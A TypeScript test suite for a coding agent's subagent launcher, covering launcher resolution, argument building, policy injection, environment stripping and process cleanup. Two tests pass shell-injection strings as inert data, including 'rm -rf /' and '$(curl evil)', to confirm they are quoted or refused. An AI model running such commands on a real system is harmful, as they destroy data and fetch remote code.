/**
 * Tests for the subagent launcher port.
 *
 * Pure module (no Pi imports), so it runs under plain
 * `node --test subagent-launch.test.ts` like the rest of the suite. Every
 * filesystem answer is injected, which is what lets one suite cover Windows,
 * macOS and Linux argv/layout rules from any host.
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import {
  ENV_STRIP_ENV,
  PI_CLI_ENV,
  PI_CLI_NODE_ENV,
  PI_CLI_NO_SELF_ENV,
  WORKFLOW_EXTENSION_ENV,
  WORKFLOW_ISOLATE_ENV,
  buildSubagentArgv,
  composeSubagentEnv,
  describeLauncher,
  parseStripList,
  resolveSubagentLauncher,
  resolveWorkflowPolicy,
  terminateSubagent,
} from "./subagent-launch.ts";

/** A path set that exists in a fake filesystem. */
function files(...paths: string[]) {
  const set = new Set(paths.map((p) => p.replace(/\\/g, "/")));
  return (target: string) => set.has(target.replace(/\\/g, "/"));
}

const NODE = "/opt/runtime/node/bin/node";
const CLI = "/opt/app/node_modules/@earendil-works/pi-coding-agent/dist/bundle/cli.js";

// ── Launcher resolution ──────────────────────────────────────────────

test("launcher: the host descriptor wins over a wrapper argv entry", () => {
  const result = resolveSubagentLauncher({
    env: {
      [PI_CLI_ENV]: CLI,
      [PI_CLI_NODE_ENV]: NODE,
      [PI_CLI_NO_SELF_ENV]: "1",
    },
    platform: "linux",
    exists: files(NODE, CLI, "/app/out/host/index.mjs"),
    execPath: NODE,
    argvEntry: "/app/out/host/index.mjs",
  });
  assert.equal(result.ok, true);
  if (!result.ok) return;
  assert.equal(result.launcher.source, "descriptor-script");
  assert.equal(result.launcher.command, NODE);
  assert.deepEqual([...result.launcher.prefix], [CLI]);
});

test("launcher: a native executable descriptor runs without a Node prefix", () => {
  const exe = "/opt/pi/bin/pi";
  const result = resolveSubagentLauncher({
    env: { [PI_CLI_ENV]: exe },
    platform: "linux",
    exists: files(exe),
    execPath: NODE,
    argvEntry: undefined,
  });
  assert.equal(result.ok, true);
  if (!result.ok) return;
  assert.equal(result.launcher.source, "descriptor-executable");
  assert.equal(result.launcher.command, exe);
  assert.deepEqual([...result.launcher.prefix], []);
});

test("launcher: an invalid descriptor refuses instead of falling back to the host entry", () => {
  const missing = resolveSubagentLauncher({
    env: { [PI_CLI_ENV]: "/nowhere/cli.js" },
    platform: "linux",
    exists: files("/app/out/host/index.mjs"),
    execPath: NODE,
    argvEntry: "/app/out/host/index.mjs",
  });
  assert.equal(missing.ok, false);
  if (missing.ok) return;
  assert.match(missing.reason, /does not exist/);

  const relative = resolveSubagentLauncher({
    env: { [PI_CLI_ENV]: "node_modules/cli.js" },
    platform: "linux",
    exists: files("node_modules/cli.js"),
    execPath: NODE,
    argvEntry: undefined,
  });
  assert.equal(relative.ok, false);
  if (relative.ok) return;
  assert.match(relative.reason, /absolute path/);
});

test("launcher: a Windows batch descriptor is refused (no shell interpolation)", () => {
  const result = resolveSubagentLauncher({
    env: { [PI_CLI_ENV]: "C:\\Program Files\\Pi\\pi.cmd" },
    platform: "win32",
    exists: files("C:\\Program Files\\Pi\\pi.cmd"),
    execPath: "C:\\Program Files\\Node\\node.exe",
    argvEntry: undefined,
  });
  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.match(result.reason, /batch shim/);
});

test("launcher: a wrapper process is never used as the CLI", () => {
  const result = resolveSubagentLauncher({
    env: {
      [PI_CLI_NO_SELF_ENV]: "1",
      PATH: "/usr/local/bin",
    },
    platform: "linux",
    exists: files("/app/out/host/index.mjs"),
    execPath: NODE,
    argvEntry: "/app/out/host/index.mjs",
  });
  assert.equal(result.ok, true);
  if (!result.ok) return;
  // No verified `pi` on PATH: the bare name is kept (spawn reports ENOENT), but
  // the wrapper entry and the wrapper marker are both reported.
  assert.equal(result.launcher.source, "path");
  assert.equal(result.launcher.command, "pi");
  assert.ok(result.problems.some((p) => p.includes("host wrapper")));
});

test("launcher: NO_SELF_LAUNCH alone disqualifies self-hosting", () => {
  const result = resolveSubagentLauncher({
    env: { [PI_CLI_NO_SELF_ENV]: "1", PATH: "/opt/bin" },
    platform: "darwin",
    exists: files("/opt/bin/pi", "/app/cli.js"),
    execPath: NODE,
    argvEntry: "/app/cli.js",
  });
  assert.equal(result.ok, true);
  if (!result.ok) return;
  assert.equal(result.launcher.source, "path");
  assert.equal(result.launcher.command, "/opt/bin/pi");
});

test("launcher: a real CLI process self-hosts (Terminal behaviour)", () => {
  const entry = "/Users/me/.pi/agent/extensions/workflow/index.ts";
  const result = resolveSubagentLauncher({
    env: {},
    platform: "darwin",
    exists: files(entry),
    execPath: "/Users/me/.nvm/versions/node/v24/bin/node",
    argvEntry: entry,
  });
  assert.equal(result.ok, true);
  if (!result.ok) return;
  assert.equal(result.launcher.source, "self");
  assert.equal(result.launcher.command, "/Users/me/.nvm/versions/node/v24/bin/node");
  assert.deepEqual([...result.launcher.prefix], [entry]);
});

test("launcher: a bun virtual entry is not self-hosted", () => {
  const result = resolveSubagentLauncher({
    env: { PATH: "/usr/bin" },
    platform: "linux",
    exists: files("/usr/bin/pi"),
    execPath: "/usr/local/bin/pi",
    argvEntry: "/$bunfs/root/pi",
  });
  assert.equal(result.ok, true);
  if (!result.ok) return;
  assert.equal(result.launcher.source, "path");
  assert.equal(result.launcher.command, "/usr/bin/pi");
});

test("launcher: Windows resolves pi.exe on PATH and reports a .cmd-only PATH", () => {
  const found = resolveSubagentLauncher({
    env: { PATH: "C:\\Windows\\system32;C:\\Tools\\pi" },
    platform: "win32",
    exists: files("C:\\Tools\\pi\\pi.exe"),
    execPath: "C:\\Program Files\\Node\\node.exe",
    argvEntry: undefined,
  });
  assert.equal(found.ok, true);
  if (!found.ok) return;
  assert.equal(found.launcher.source, "path");
  assert.equal(found.launcher.command, "C:\\Tools\\pi\\pi.exe");

  const onlyCmd = resolveSubagentLauncher({
    env: { PATH: "C:\\Tools\\pi" },
    platform: "win32",
    exists: files("C:\\Tools\\pi\\pi.cmd"),
    execPath: "C:\\Program Files\\Node\\node.exe",
    argvEntry: undefined,
  });
  assert.equal(onlyCmd.ok, false);
  if (onlyCmd.ok) return;
  assert.match(onlyCmd.reason, /no Pi CLI launcher/);
});

test("launcher: paths with spaces stay one argv entry", () => {
  const node = "C:\\Program Files\\Pi Runtime\\node.exe";
  const cli = "C:\\Program Files\\Pi Runtime\\node_modules\\cli.js";
  const result = resolveSubagentLauncher({
    env: { [PI_CLI_ENV]: cli, [PI_CLI_NODE_ENV]: node },
    platform: "win32",
    exists: files(node, cli),
    execPath: node,
    argvEntry: "C:\\Program Files\\Pi Desktop\\resources\\out\\host\\index.mjs",
  });
  assert.equal(result.ok, true);
  if (!result.ok) return;
  assert.equal(result.launcher.command, node);
  assert.deepEqual([...result.launcher.prefix], [cli]);
  assert.match(describeLauncher(result.launcher), /"C:\\\\Program Files/);
});

// ── argv ─────────────────────────────────────────────────────────────

test("argv: model, thinking, tools and prompt are separate entries", () => {
  const built = buildSubagentArgv({
    agent: {
      name: "scout",
      model: "anthropic/claude-sonnet-4-5",
      thinking: "HIGH",
      tools: ["read", "grep", "find", "ls"],
      systemPrompt: "be terse",
    },
    promptPath: "/tmp/pi subagent/prompt-scout.md",
    task: "map the repo",
    policyArgs: ["--extension", "/opt/workflow/index.js"],
  });
  assert.equal(built.ok, true);
  if (!built.ok) return;
  assert.deepEqual(built.args, [
    "--mode",
    "json",
    "-p",
    "--no-session",
    "--model",
    "anthropic/claude-sonnet-4-5",
    "--thinking",
    "high",
    "--tools",
    "read,grep,find,ls",
    "--append-system-prompt",
    "/tmp/pi subagent/prompt-scout.md",
    "--extension",
    "/opt/workflow/index.js",
    "--",
    "Task: map the repo",
  ]);
});

test("argv: shell metacharacters in the task are one inert entry", () => {
  const task = 'echo "; rm -rf /" && $(curl evil) `id` | tee "x y"';
  const built = buildSubagentArgv({
    agent: { name: "scout", tools: ["read"] },
    promptPath: null,
    task,
  });
  assert.equal(built.ok, true);
  if (!built.ok) return;
  assert.equal(built.args.at(-1), `Task: ${task}`);
  assert.equal(built.args.at(-2), "--");
  // No entry is ever a concatenated command line.
  assert.ok(!built.args.some((arg) => arg.includes(" --mode ")));
});

test("argv: invalid model, thinking, tool names and NUL bytes are refused", () => {
  const model = buildSubagentArgv({
    agent: { name: "scout", model: "claude; rm -rf /" },
    promptPath: null,
    task: "x",
  });
  assert.equal(model.ok, false);

  const thinking = buildSubagentArgv({
    agent: { name: "scout", thinking: "banana" },
    promptPath: null,
    task: "x",
  });
  assert.equal(thinking.ok, false);

  const tool = buildSubagentArgv({
    agent: { name: "scout", tools: ["read,grep"] },
    promptPath: null,
    task: "x",
  });
  assert.equal(tool.ok, false);

  const nul = buildSubagentArgv({
    agent: { name: "scout" },
    promptPath: null,
    task: "a\0b",
  });
  assert.equal(nul.ok, false);
});

test("argv: no optional flags are invented", () => {
  const built = buildSubagentArgv({
    agent: { name: "scout" },
    promptPath: null,
    task: "hello",
  });
  assert.equal(built.ok, true);
  if (!built.ok) return;
  assert.deepEqual(built.args, ["--mode", "json", "-p", "--no-session", "--", "Task: hello"]);
});

// ── policy injection ─────────────────────────────────────────────────

test("policy: the resolved descriptor is injected once, additively", () => {
  const resolved = resolveWorkflowPolicy({
    env: { [WORKFLOW_EXTENSION_ENV]: "/opt/workflow/index.js" },
    exists: files("/opt/workflow/index.js"),
    selfPath: "/home/me/.pi/agent/extensions/workflow/index.ts",
    role: "explorer",
  });
  assert.equal(resolved.ok, true);
  if (!resolved.ok) return;
  assert.deepEqual(resolved.args, ["--extension", "/opt/workflow/index.js"]);
  assert.equal(resolved.source, "descriptor");
  assert.equal(resolved.isolated, false);
});

test("policy: isolation wins for a staged artifact", () => {
  const resolved = resolveWorkflowPolicy({
    env: {
      [WORKFLOW_EXTENSION_ENV]: "/opt/workflow/index.js",
      [WORKFLOW_ISOLATE_ENV]: "1",
    },
    exists: files("/opt/workflow/index.js"),
    selfPath: null,
    role: "reviewer",
  });
  assert.equal(resolved.ok, true);
  if (!resolved.ok) return;
  assert.deepEqual(resolved.args, ["--no-extensions", "--extension", "/opt/workflow/index.js"]);
  assert.equal(resolved.isolated, true);
});

test("policy: isolation without a descriptor is reported, never silently applied", () => {
  const resolved = resolveWorkflowPolicy({
    env: { [WORKFLOW_ISOLATE_ENV]: "1" },
    exists: files("/home/me/.pi/agent/extensions/workflow/index.ts"),
    selfPath: "/home/me/.pi/agent/extensions/workflow/index.ts",
    role: "explorer",
  });
  assert.equal(resolved.ok, true);
  if (!resolved.ok) return;
  assert.deepEqual(resolved.args, ["--extension", "/home/me/.pi/agent/extensions/workflow/index.ts"]);
  assert.equal(resolved.isolated, false);
  assert.ok(resolved.problems.some((p) => p.includes(WORKFLOW_ISOLATE_ENV)));
});

test("policy: this extension is the fallback so the bash gate always loads", () => {
  const resolved = resolveWorkflowPolicy({
    env: {},
    exists: files("/home/me/.pi/agent/extensions/workflow/index.ts"),
    selfPath: "/home/me/.pi/agent/extensions/workflow/index.ts",
    role: "planner",
  });
  assert.equal(resolved.ok, true);
  if (!resolved.ok) return;
  assert.deepEqual(resolved.args, ["--extension", "/home/me/.pi/agent/extensions/workflow/index.ts"]);
  assert.equal(resolved.source, "self");
});

test("policy: a gated role without a resolvable policy is refused", () => {
  const resolved = resolveWorkflowPolicy({
    env: {},
    exists: () => false,
    selfPath: null,
    role: "explorer",
  });
  assert.equal(resolved.ok, false);
  if (resolved.ok) return;
  assert.match(resolved.reason, /bash gate would be missing/);
});

test("policy: an unrestricted child needs no injection", () => {
  const resolved = resolveWorkflowPolicy({
    env: {},
    exists: () => false,
    selfPath: null,
    role: undefined,
  });
  assert.equal(resolved.ok, true);
  if (!resolved.ok) return;
  assert.deepEqual(resolved.args, []);
  assert.equal(resolved.source, "none");
});

test("policy: a relative or missing descriptor is refused", () => {
  const relative = resolveWorkflowPolicy({
    env: { [WORKFLOW_EXTENSION_ENV]: "workflow/index.js" },
    exists: () => true,
    selfPath: null,
    role: "explorer",
  });
  assert.equal(relative.ok, false);
  if (relative.ok) return;
  assert.match(relative.reason, /absolute path/);

  const missing = resolveWorkflowPolicy({
    env: { [WORKFLOW_EXTENSION_ENV]: "/opt/workflow/index.js" },
    exists: () => false,
    selfPath: null,
    role: "explorer",
  });
  assert.equal(missing.ok, false);
});

// ── environment ──────────────────────────────────────────────────────

test("env: role, folder and shell ceilings are propagated as variables", () => {
  const env = composeSubagentEnv({
    baseEnv: {
      PATH: "/opt/runtime/bin:/usr/bin",
      PI_CODING_AGENT_DIR: "/home/me/.pi/agent",
      OPENAI_API_KEY: "sk-test",
      HOME: "/home/me",
    },
    role: "explorer",
    folderEnv: { PI_FOLDER_POLICY_LOCKED: "1", PI_FOLDER_POLICY_ROOTS: '["/repo"]' },
    shellEnv: { PI_SHELL_GUARD_LIMITS: '{"maxTimeoutSeconds":120}' },
  });
  assert.equal(env.PI_WORKFLOW_ROLE, "explorer");
  assert.equal(env.PI_FOLDER_POLICY_LOCKED, "1");
  assert.equal(env.PI_FOLDER_POLICY_ROOTS, '["/repo"]');
  assert.equal(env.PI_SHELL_GUARD_LIMITS, '{"maxTimeoutSeconds":120}');
  // Profile + providers + PATH survive so the child reads the same settings.
  assert.equal(env.PI_CODING_AGENT_DIR, "/home/me/.pi/agent");
  assert.equal(env.OPENAI_API_KEY, "sk-test");
  assert.equal(env.PATH, "/opt/runtime/bin:/usr/bin");
  assert.equal(env.HOME, "/home/me");
});

test("env: the host's declared wrapper variables are stripped from the child", () => {
  // Workflow names no frontend's variables: the host lists its own markers in
  // PI_SUBAGENT_ENV_STRIP, so this module stays host-agnostic.
  const hostMarkers = ["HOST_MODE", "HOST_ROLE", "SESSION_ID", "HOST_ENTRY", "BRIDGE_PORT"];
  const base: Record<string, string> = {
    PATH: "/usr/bin",
    PI_SUBAGENT_PI_NODE: "/opt/runtime/node",
    [ENV_STRIP_ENV]: [...hostMarkers, "OFFICE_TOKEN"].join(","),
  };
  for (const name of hostMarkers) base[name] = "1";
  base.OFFICE_TOKEN = "y";
  base[PI_CLI_NO_SELF_ENV] = "1";
  const env = composeSubagentEnv({ baseEnv: base, role: "reviewer" });
  for (const name of hostMarkers) assert.equal(env[name], undefined, name);
  assert.equal(env[PI_CLI_NO_SELF_ENV], undefined);
  assert.equal(env.OFFICE_TOKEN, undefined);
  // The launcher/runtime contract stays: the child may spawn its own children.
  assert.equal(env.PI_SUBAGENT_PI_NODE, "/opt/runtime/node");
  assert.equal(env.PATH, "/usr/bin");
});

test("env: an explicit strip list is honoured and the base is not mutated", () => {
  const base = { PATH: "/usr/bin", SECRET_TOKEN: "s", KEEP: "k" };
  const env = composeSubagentEnv({ baseEnv: base, strip: ["SECRET_TOKEN"] });
  assert.equal(env.SECRET_TOKEN, undefined);
  assert.equal(env.KEEP, "k");
  assert.equal(base.SECRET_TOKEN, "s");
  assert.deepEqual(parseStripList(" a, b  c "), ["a", "b", "c"]);
  assert.deepEqual(parseStripList(undefined), []);
});

test("env: no role leaves the child ungated (normal Pi session)", () => {
  const env = composeSubagentEnv({ baseEnv: { PATH: "/usr/bin" }, role: undefined });
  assert.equal(env.PI_WORKFLOW_ROLE, undefined);
});

// ── process cleanup ──────────────────────────────────────────────────

test("cleanup: Windows uses taskkill /T so bash children die too", () => {
  const calls: { command: string; args: readonly string[] }[] = [];
  const result = terminateSubagent(4242, {
    platform: "win32",
    kill: () => {
      throw new Error("should not be needed");
    },
    spawn: (command, args) => {
      calls.push({ command, args });
      return { on: () => undefined, unref: () => undefined };
    },
  });
  assert.equal(result, "taskkill");
  assert.deepEqual(calls, [{ command: "taskkill", args: ["/pid", "4242", "/T", "/F"] }]);
});

test("cleanup: a failed taskkill falls back to a signal", () => {
  const killed: number[] = [];
  let onError: (() => void) | undefined;
  const result = terminateSubagent(7, {
    platform: "win32",
    kill: (pid) => {
      killed.push(pid);
      return true;
    },
    spawn: () => ({
      on: (event, listener) => {
        if (event === "error") onError = listener;
        return undefined;
      },
    }),
  });
  assert.equal(result, "taskkill");
  onError?.();
  assert.deepEqual(killed, [7]);
});

test("cleanup: POSIX sends SIGTERM and unknown pids are a no-op", () => {
  const signals: { pid: number; signal?: NodeJS.Signals | number }[] = [];
  const deps = {
    platform: "linux",
    kill: (pid: number, signal?: NodeJS.Signals | number) => {
      signals.push(signal === undefined ? { pid } : { pid, signal });
      return true;
    },
    spawn: () => {
      throw new Error("never spawns on POSIX");
    },
  };
  assert.equal(terminateSubagent(99, deps), "signal");
  assert.deepEqual(signals, [{ pid: 99, signal: "SIGTERM" }]);
  assert.equal(terminateSubagent(undefined, deps), "none");
  assert.equal(terminateSubagent(0, deps), "none");
});
